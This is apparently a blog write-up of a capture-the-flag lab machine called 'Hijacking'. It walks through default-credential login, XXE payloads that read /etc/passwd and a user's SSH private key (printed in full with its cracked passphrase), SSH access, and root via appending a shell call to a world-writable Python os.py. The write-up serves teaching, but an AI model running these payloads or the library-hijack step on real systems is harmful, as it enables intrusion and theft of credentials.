---
layout: post
author: maxin
title:  "Hijacking"
date:   2022-03-18 10:57:30 AM -03
category: CrowSec
tags: Writeup
---

# Enumeration

## Nmap

{% highlight text %}
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
{% endhighlight %}

## Port 80

This page has a login page and we can access with default credentials, like: admin/admin

After pass the login, we can see the page has a comment option

![Untitled](/images/hijacking/xmlInput.png)

When we click “submit” the page create an alert saying that we need to insert XML code. We can see a random character and we receive empty fields

![Untitled](/images/hijacking/outputXML.png)

Now we can create our xml payload

### XXE

I use this payload to test XXE and the variable show on name field

`<!DOCTYPE test [<!ENTITY xxe "Teste">]><root><name>&xxe;</name><author>aaa</author></root>`

We can use XXE to read internal files

`<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name><author>aaa</author></root>`

Note: Use burpsuite to make the request, it's easier.

{% highlight text  %}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
------------------ SNIP ------------------
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
suporte:x:1001:1001:,,,:/home/suporte:/bin/bash
{% endhighlight %}

The machine has a user name Suporte. We can try to enumerate his home directory and try to grab the private key

`<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///home/suporte/.ssh/id_rsa">]><root><name>&xxe;</name><author>aaa</author></root>`

{% highlight text %}
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,04A3681D22D979CC861329935A0DC5F4

dZZfYYgen8zl8EC9lZ/b+p6NkqA8Bsd7fLIjK+v8n+qY7GwGOFFo8c3vUWGVMLpg
Xkz5SsQbI/r76ZzMF0UW37m9hoXOLcD5DfgUC7JTii4Mt9UNUfTccyvGIHOj3JrG
lQNvg/geTiV39ZGX0ApJCeKJ7BgKA7Aw4wwPKt2fsk5oA2hAOS5QNkpao1GRaIiB
Az/HMCahKcvf8rAItoxXXhfSBQnSs77qyNFu6eRxtFWJ5Lj3UXsafZIv/UHCs/aJ
Ok3jxEMk6q/SuJ0ueoKgnuYdB8DOPITV5mkbiBg+9R4MMnINIPyz+yRcD1OEeKWd
I+mkBLN82soPZhY8D0Kl3laVpHZUj0Q8UbfSD10kzQzfKH0Vmtcdlfx76zanYbRk
tPEd6jTk1wcE22PLDH5h1YFOR9ABvwQpV02LtW9P+BlX4ImqWPCR6vHYWlxhvmmk
+5l6GxAfbiBEr/rqfE46PDj5cWw9J5jXmFfXcBskw9bT/FdQAze5yT19yXEgHqxK
9EcU0CUlxS/c2rqWOpcoTvlHeH1rWBf29esW5HNGElORWyzhKpC+ti/nrU23V5HB
eEwa0QDmT0xH3ruoeG4h9U6bG/h00wlNDvtfLCkps1oSKpjAGOoLEAy/6WdAKqCR
so2JF7t3k1xCVkgUtC6dKhpCjin2m+wB1s40MQcM0XmCQf+cpP+l7rbaO2qRecxD
kIcbP4lXDMd0Ip2wTPuUgBdBrI9U8ilM1PPYIoSIqZAun7v6sRxypM+11nMkQY1A
A6F2rOCO5dxNYKROZNr2LoQY0ZDMy+oec0R55y5W0Qxrka4JiO9uwWAmTTTxBP3q
K1FMIq7VsacAdQCzAfVYPdaEcRyKSxsgUGSYed7tDAf6UAbYG7cYtRqTIUYqENiv
S5hg7phrpC3LV2sgNGC/Gz0ULQwHmOXOaZY9saBQ7GBppxRx5qLz8Qxw0G7AzBJD
5itilQEjyx0I3T/Btf1+ipfgf9G4sKFYDfFbSx01PZHmmyzcyPRXkC8dW1D5SkUK
LirThuoHn8FQvvBdqv7ZvRInc4ykfkQ8ZmrfZFILI/logOV2XNQ8hOQ6/qK5TsER
Cq543XP8BefOp8B5F/Di55efmLjWZr4CVyhenGTKZd5SZP5RW80FcI1B4td+Wxph
wGpvYPn7D0FQMxaLftwT6734lLQLVQp3NZIogQLVRhJdG4k4AturjS2VKAZ1Rgcx
yYXQLM9f2HQqi+n2DquXzYEybQJ6zrD2ZpEvfOuSYaASDtrlDJ3u+m26C5RqdWp/
wNhus7h2y3vXlT20SXhJtV0lLwZEVJuiGs+xO2gMd93DXCW41p9HmgTmABoGdx8u
AoA35k+62FvYXVC76mZVhg3RYyYFdsFKDVAuvO74lwPqJKnU6Par3Xgg/gPL7mI0
MVuUE2UQbDkieIfx5MyDa2gC1OVHxQmOZ5XelhfVFtDLUDZNqNlVasYflhxLwjrV
n69/4SyzYMAlM/gOb2TQi3VshDEGGxz6NNKEImJY4AgyEHTlike34Ro2qt+lhT7D
P/OoncO6IYFFtEoFXMYvFndZ8PebtPDMmBt5Ph/vKfhlBwfE4Sx09vqhOa5yZ5zb
-----END RSA PRIVATE KEY-----
{% endhighlight %}

We need to bruteforce the private-key password

{% highlight bash %}
ssh2john id_rsa > id_rsa.hash # PASS:1qaz@WSX
{% endhighlight %}

{% highlight bash %}
ssh -i id_rsa suporte@$IP
{% endhighlight %}

Note: user.txt is in /opt directory

## Root

{% highlight text %}
sudo -l

User suporte may run the following commands on ip-10-9-2-12:
    (root) NOPASSWD: /usr/bin/python3.6 /opt/vert.py
{% endhighlight %}

{% highlight python %}
import os

class Vector:
   def __init__(self, a, b):
      self.a = a
      self.b = b

   def __str__(self):
      return 'Vector (%d, %d)' % (self.a, self.b)

   def __add__(self,other):
      return Vector(self.a + other.a, self.b + other.b)

v1 = Vector(2,10)
v2 = Vector(5,-2)
print(v1 + v2)
{% endhighlight %}

This script import os, but never use. We can see if user suporte has access to lib os 

{% highlight python %}
find / -name os.py -type f 2>/dev/null

ls -la /usr/lib/python3.6/os.py
-rw-rw-rw- 1 root root 37546 Feb 22 20:48 /usr/lib/python3.6/os.py
{% endhighlight %}

### Library hijacking

{% highlight python %}
echo 'system("/bin/bash")' >> /usr/lib/python3.6/os.py
{% endhighlight %}

`sudo /usr/bin/python3.6 /opt/vert.py`